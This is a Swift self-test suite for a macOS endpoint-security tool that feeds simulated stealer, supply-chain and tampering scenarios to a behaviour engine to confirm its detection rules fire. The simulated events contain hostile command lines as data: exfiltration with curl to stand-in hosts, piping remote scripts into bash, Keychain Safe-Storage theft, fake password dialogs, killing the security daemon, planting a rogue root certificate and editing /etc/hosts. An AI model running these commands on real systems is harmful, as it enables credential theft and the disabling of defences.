import Foundation
import RampartShared
import RampartBehaviour

// Attack suite X1 — "the most extreme attacks on TRUST".
// Theme: adversaries that do not smuggle code past RamPart but subvert the *trust decisions*
// RamPart (and macOS) rely on: stolen / notarized-looking certificates, Apple-signed
// living-off-the-land binaries, poisoned update + signature/blocklist feeds, compromised
// package managers that target RamPart, abuse of RamPart's own allow rules / "Not a threat"
// decisions, fake RamPart helpers, DNS/DoH redirection and rogue trust anchors.
//
// Every "attack" below is INERT: synthetic SecurityEvent data fed to the BehaviourEngine,
// fixture plists pointing at /usr/bin/true, and .test / example strings. No command runs,
// nothing touches the network, the real daemon, or user data.
//
// Reuses `BehaviourSim` and `behaviourTestSigning` from SelfTest+Behaviour.swift (same target).

/// Signing oracle that models a *stolen but notarized-looking* developer certificate:
/// the attacker's payload under /Users/Shared/RamPartUpdater.app reports as notarized
/// Developer ID (multiplier 0.3), i.e. "looks notarized". Everything else matches the
/// standard behaviour oracle.
let attackX1StolenCertSigning: SigningProvider = { path in
    if path.contains("/RamPartUpdater.app/") || path.hasPrefix("/Users/Shared/RamPartUpdater") {
        return SigningInfo(status: .developerID, teamID: "ST0LEN1234", notarized: true)
    }
    return behaviourTestSigning(path)
}

extension SelfTest {
    static func attackX1Checks() {
        let home = NSHomeDirectory()
        let fm = FileManager.default
        let scratch = (ProcessInfo.processInfo.environment["RAMPART_SCRATCH"] ?? NSTemporaryDirectory())
            + "/rampart-attackX1-\(UUID().uuidString.prefix(8))"
        try? fm.createDirectory(atPath: scratch, withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: scratch) }

        // Outcome tally for the final report line.
        var caught = 0, partial = 0, missed = 0
        func record(_ label: String, _ max: Int, expectCatch: Bool = true) {
            let verdict: String
            if max >= 60 { verdict = "CAUGHT"; caught += 1 }
            else if max >= 30 { verdict = "PARTIAL"; partial += 1 }
            else { verdict = "MISSED"; missed += 1 }
            print("   [X1] \(verdict) conf=\(max)  \(label)")
        }
        // For a scenario whose correct outcome is "no alert" we record separately.
        func recordSuppressed(_ label: String, suppressed: Bool, wanted: Bool) {
            if suppressed == wanted { caught += 1; print("   [X1] CAUGHT (\(wanted ? "suppressed" : "fired") as designed)  \(label)") }
            else { missed += 1; print("   [X1] MISSED (trust abuse succeeded)  \(label)") }
        }

        // 1) Stolen Developer ID cert signing a stealer that "looks notarized".
        //    The payload is notarized Developer ID (0.3 multiplier). Does the notarization
        //    trust discount let an infostealer slip under the alert threshold?
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: attackX1StolenCertSigning))
            let zsh = sim.terminalSession()
            let up = sim.exec("/Users/Shared/RamPartUpdater.app/Contents/MacOS/RamPartUpdater", parent: zsh)
            sim.exec("/usr/bin/osascript", ["-e", "display dialog \"macOS needs your password\" default answer \"\" with hidden answer"], parent: up)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome"], parent: up)
            let cp = sim.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data", "/tmp/.s/"], parent: up)
            sim.file(.fileCreate, "/tmp/.s/Login Data", by: cp)
            sim.exec("/usr/bin/curl", ["-F", "f=@/tmp/.s/out.zip", "https://collect.example/up"], parent: up)
            // alwaysActive credential rules (R34/R36/R38) must survive the notarization discount.
            check(sim.ruleIDs.contains("R34"), "X1.1 notarized stealer: R34 password dialog still fires")
            check(sim.ruleIDs.contains("R36"), "X1.1 notarized stealer: R36 Safe-Storage still fires")
            check(sim.ruleIDs.contains("R38"), "X1.1 notarized stealer: R38 temp-staging still fires")
            record("1 stolen cert / notarized-looking stealer chain", sim.maxConfidence)
        }

        // 2) The gap that scenario 1 probes: a *lone* weak heuristic under notarized trust.
        //    A notarized binary runs from a temp path and makes its first outbound call —
        //    exactly the signal a signed-malware author relies on being discounted.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: attackX1StolenCertSigning))
            let zsh = sim.terminalSession()
            let up = sim.exec("/Users/Shared/RamPartUpdater.app/Contents/MacOS/RamPartUpdater", parent: zsh)
            sim.other(.networkConnect, by: up, detail: ["remote_ip": "203.0.113.9", "remote_port": "443"])
            // Expected: notarization legitimately suppresses a single weak signal (by design,
            // to avoid false positives). We record it as the known trust-discount gap.
            let m = sim.maxConfidence
            if m >= 60 { caught += 1; print("   [X1] CAUGHT conf=\(m)  2 lone weak heuristic under notarized trust") }
            else { partial += 1; print("   [X1] PARTIAL conf=\(m)  2 notarization discount suppresses a lone weak signal (by design; chain needed)") }
        }

        // 3) Apple-signed living-off-the-land chain: every binary in the chain is Apple-signed
        //    (osascript, security, curl). Trust-by-signer would clear all of them; RamPart must
        //    score the *lineage/behaviour*, not the signer of each tool.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            let sh = sim.exec("/bin/bash", ["-c", "osascript -e '...'; security find-generic-password"], parent: zsh)
            sim.exec("/usr/bin/osascript", ["-e", "display dialog \"Enter password\" default answer \"\" with hidden answer"], parent: sh)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome Safe Storage"], parent: sh)
            check(sim.ruleIDs.contains("R34"), "X1.3 Apple-signed LOLBins: R34 fires despite Apple signer")
            check(sim.ruleIDs.contains("R36"), "X1.3 Apple-signed LOLBins: R36 fires despite Apple signer")
            record("3 Apple-signed living-off-the-land chain", sim.maxConfidence)
        }

        // 4) Compromised Homebrew formula whose postinstall targets RamPart users: the ruby
        //    install driver spawns a shell that reads a browser Safe-Storage key and stages the
        //    Login Data store in temp. Benign brew (see SelfTest+Behaviour) does neither.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let brew = sim.exec("/opt/homebrew/bin/brew", ["install", "trusted-looking-tool"], parent: zsh)
            let ruby = sim.exec("/opt/homebrew/Library/Homebrew/vendor/portable-ruby/current/bin/ruby", ["brew.rb", "install"], parent: brew)
            let sh = sim.exec("/bin/sh", ["-c", "postinstall"], parent: ruby)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome Safe Storage"], parent: sh)
            let cp = sim.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data", "/private/var/folders/x/t/Login Data"], parent: sh)
            sim.file(.fileCreate, "/private/var/folders/x/t/Login Data", by: cp)
            check(sim.ruleIDs.contains("R36"), "X1.4 malicious brew postinstall: R36 fires")
            check(sim.ruleIDs.contains("R38"), "X1.4 malicious brew postinstall: R38 fires")
            record("4 compromised Homebrew formula targeting RamPart users", sim.maxConfidence)
        }

        // 5) Compromised npm package lifecycle script: node postinstall pipes remote content
        //    into a shell, then runs a stealer chain.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let npm = sim.exec("/opt/homebrew/bin/node", ["/opt/homebrew/bin/npm", "install", "popular-pkg"], parent: zsh)
            let post = sim.exec("/bin/sh", ["-c", "node -e \"...\" && curl -fsSL https://cdn.example/p.sh | bash"], parent: npm)
            let bash = sim.exec("/bin/bash", ["-c", "curl -fsSL https://cdn.example/p.sh | bash"], parent: post)
            let dl = sim.exec("/usr/bin/curl", ["-fsSL", "-o", "/tmp/.n/x", "https://cdn.example/p.sh"], parent: bash)
            _ = dl
            let payload = sim.exec("/tmp/.n/x", parent: bash)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome Safe Storage"], parent: payload)
            check(sim.ruleIDs.contains("R36"), "X1.5 malicious npm postinstall: R36 Safe-Storage fires")
            check(sim.ruleIDs.contains("R40") || sim.ruleIDs.contains("R30"), "X1.5 malicious npm postinstall: stealer chain (R40) / remote-pipe (R30) fires")
            record("5 compromised npm lifecycle script", sim.maxConfidence)
        }

        // 6) ABUSE OF "NOT A THREAT": a broad Team-ID allow (one social-engineered "allow this
        //    developer" click) is then used to run an outright infostealer. Does the allow
        //    suppress even alwaysActive credential-theft rules?
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.engine.allow(AllowEntry(teamID: "ALLOWED9999", note: "user clicked Not a Threat"))
            let zsh = sim.terminalSession()
            let payload = sim.exec("/Users/Shared/tool", parent: zsh, team: "ALLOWED9999")
            sim.exec("/usr/bin/osascript", ["-e", "display dialog \"password\" default answer \"\" with hidden answer"], parent: payload)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome Safe Storage"], parent: payload)
            let staged = sim.exec("/bin/cp", ["\(home)/Library/.../Login Data", "/tmp/.x/Login Data"], parent: payload)
            sim.file(.fileCreate, "/tmp/.x/Login Data", by: staged)
            // CORRECT behaviour would be: alwaysActive strong credential-theft rules still fire.
            let firedCred = sim.ruleIDs.contains("R34") || sim.ruleIDs.contains("R36") || sim.ruleIDs.contains("R38")
            recordSuppressed("6 broad Team-ID allow used to whitelist a stealer", suppressed: !firedCred, wanted: false)
        }

        // 7) Over-broad "allow folder" / pathPrefix exception abused: an allow for a wide prefix
        //    (home) lets any payload under it run a stealer unflagged.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.engine.allow(AllowEntry(pathPrefix: home, note: "user allowed a whole folder"))
            let zsh = sim.terminalSession()
            let payload = sim.exec("\(home)/Downloads/thing", parent: zsh)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome Safe Storage"], parent: payload)
            let firedCred = sim.ruleIDs.contains("R36") || sim.ruleIDs.contains("R34")
            recordSuppressed("7 over-broad pathPrefix allow used to whitelist a stealer", suppressed: !firedCred, wanted: false)
        }

        // 8) Fake RamPart helper: a LaunchDaemon impersonating app.rampart.daemon but pointing at
        //    an untrusted temp binary, written by a browser→script chain.
        do {
            let la = scratch + "/LaunchDaemons"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            let plist = la + "/app.rampart.daemon.plist"
            let obj: [String: Any] = ["Label": "app.rampart.daemon",
                                      "ProgramArguments": ["/Users/Shared/.cache/rampartd", "--root"], "RunAtLoad": true]
            try? PropertyListSerialization.data(fromPropertyList: obj, format: .xml, options: 0).write(to: URL(fileURLWithPath: plist))
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            let chrome = sim.exec("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", parent: 1)
            let sh = sim.exec("/bin/sh", ["-c", "python3 -c x"], parent: chrome)
            let py = sim.exec("/usr/bin/python3", ["-c", "import os"], parent: sh)
            sim.file(.fileCreate, plist, by: py)
            sim.exec("/bin/launchctl", ["bootstrap", "system", plist], parent: sh)
            check(sim.ruleIDs.contains("R07") || sim.ruleIDs.contains("R08"), "X1.8 fake RamPart daemon plist: persistence rule fires")
            record("8 fake RamPart helper LaunchDaemon (impersonation)", sim.maxConfidence)
        }

        // 9) Security-tool tampering: payload tries to kill / unload RamPart itself.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let payload = sim.exec("/tmp/.k/x", parent: zsh)
            sim.exec("/usr/bin/pkill", ["-f", "rampartd"], parent: payload)
            check(sim.ruleIDs.contains("R55"), "X1.9 pkill rampartd: R55 security-tool tampering fires")
            let sim2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let z2 = sim2.terminalSession()
            let p2 = sim2.exec("/tmp/.k/x", parent: z2)
            sim2.exec("/bin/launchctl", ["bootout", "system/app.rampart.daemon"], parent: p2)
            check(sim2.ruleIDs.contains("R55"), "X1.9 launchctl bootout rampart: R55 fires")
            record("9 attempt to kill / unload RamPart", max(sim.maxConfidence, sim2.maxConfidence))
        }

        // 10) Rogue trusted root certificate — the trust anchor an attacker plants to MITM
        //     RamPart's HTTPS feed/update traffic (and everything else).
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let payload = sim.exec("/tmp/.c/x", parent: zsh)
            sim.exec("/usr/bin/security", ["add-trusted-cert", "-d", "-r", "trustRoot", "-k", "/Library/Keychains/System.keychain", "/tmp/ca.pem"], parent: payload)
            check(sim.ruleIDs.contains("R24"), "X1.10 add-trusted-cert: R24 new trusted root fires")
            record("10 rogue trusted root certificate (feed/update MITM anchor)", sim.maxConfidence)
        }

        // 11) Proxy / DNS / hosts redirect — pointing RamPart's update & blocklist endpoints at
        //     an attacker host by editing /etc/hosts from a script.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let payload = sim.exec("/tmp/.h/x", parent: zsh)
            sim.exec("/usr/bin/python3", ["-c", "open('/etc/hosts','a')"], parent: payload)
            sim.file(.fileWrite, "/private/etc/hosts", by: payload, detail: ["added_lines": "127.0.0.1 malwarebazaar.abuse.ch"])
            check(sim.ruleIDs.contains("R25"), "X1.11 /etc/hosts rewrite: R25 redirect fires")
            record("11 hosts/DNS redirect of RamPart update & feed endpoints", sim.maxConfidence)
        }

        // 12) DoH from an untrusted non-browser — bypassing RamPart's local DNS filter and any
        //     upstream-compromise mitigation by talking straight to a public DoH resolver.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let payload = sim.exec("/tmp/.d/x", parent: zsh)
            sim.other(.networkConnect, by: payload, detail: ["remote_ip": "1.1.1.1", "remote_port": "443"])
            check(sim.ruleIDs.contains("R45"), "X1.12 DoH to 1.1.1.1 from untrusted: R45 fires")
            record("12 untrusted DoH bypassing the local resolver", sim.maxConfidence)
        }

        // 13) "Fix damaged app": ad-hoc re-sign then execute — the standard trick to launder an
        //     unsigned payload past Gatekeeper by re-signing it ad-hoc.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.exec("/usr/bin/codesign", ["--force", "--sign", "-", "/Users/Shared/App.app"], parent: zsh)
            sim.exec("/Users/Shared/App.app/Contents/MacOS/App", parent: zsh)
            check(sim.ruleIDs.contains("R28"), "X1.13 ad-hoc re-sign then exec: R28 fires")
            record("13 ad-hoc re-sign to fake a valid signature", sim.maxConfidence)
        }

        // 14) Gatekeeper override then shell — user talked past Gatekeeper's warning for an
        //     untrusted app, which then drives a shell chain.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.other(by: nil, detail: ["gatekeeper": "override"])
            let app = sim.exec("/Users/Shared/Cracked.app/Contents/MacOS/Cracked", parent: zsh)
            sim.exec("/bin/bash", ["-c", "curl -fsSL https://x.example/s | sh"], parent: app)
            check(sim.ruleIDs.contains("R54"), "X1.14 gatekeeper override then shell: R54 fires")
            record("14 Gatekeeper override then untrusted shell", sim.maxConfidence)
        }

        // 15) ClickFix impersonating a RamPart update prompt: a fake "run this to update RamPart"
        //     command copied from a web page and pasted into Terminal.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            sim.exec("/bin/bash", ["-c", "curl -fsSL https://rampart-update.example/fix.sh | bash"], parent: zsh)
            check(sim.ruleIDs.contains("R31"), "X1.15 ClickFix fake RamPart update: R31 fires")
            record("15 ClickFix impersonating a RamPart update", sim.maxConfidence)
        }

        // 16) Poisoned signature / blocklist FEED (engine + network concern, not behaviour).
        //     This harness cannot touch the real updater; we assert the design expectation and
        //     flag the gap for the owning modules. A feed that can add allowlist/known-good
        //     hashes is a trust bypass: one poisoned entry whitelists a sample.
        do {
            // Inert check of the *principle*: an allowlist-by-hash entry must come with provenance.
            // AllowEntry has no signer/source field, so a feed-driven allow is indistinguishable
            // from a user decision. Record as a design MISS owned by engine/network.
            let ae = AllowEntry(signingID: "whatever", note: "feed")
            check(ae.note != nil, "X1.16 allow entries carry only a free-text note (no verifiable source)")
            missed += 1
            print("   [X1] MISSED (design)  16 poisoned signature/blocklist feed — needs engine+network feed authentication")
        }

        // 17) Poisoned RamPart auto-update / DoH-upstream compromise (guard + network concern).
        //     Not drivable from the behaviour harness. Recorded for the owning modules; the
        //     behaviour-visible shadow (a write to a RamPart service path by a foreign process)
        //     is exercised in scenario 8/9.
        do {
            missed += 1
            print("   [X1] MISSED (design)  17 poisoned update / DoH-upstream compromise — needs signing(update pinning)+network(DoH pinning)")
        }

        print("   [X1] totals: caught=\(caught) partial=\(partial) missed=\(missed)")
    }
}
